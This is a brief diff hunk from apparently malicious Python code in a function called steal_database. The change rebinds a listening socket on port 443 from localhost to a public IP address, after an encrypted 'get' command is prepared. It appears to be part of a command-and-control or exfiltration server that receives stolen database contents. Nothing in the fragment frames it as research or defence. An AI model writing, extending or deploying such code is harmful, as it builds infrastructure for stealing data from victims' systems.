@@ -33,7 +33,7 @@ def steal_database():
     ciphertext = obj.encrypt("get0000000000000")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     port = 443             
-    s.bind(('localhost', port))
+    s.bind(('3.215.107.66', port))
     s.listen(1)
     print("Listening on port 443")
     count = 0 
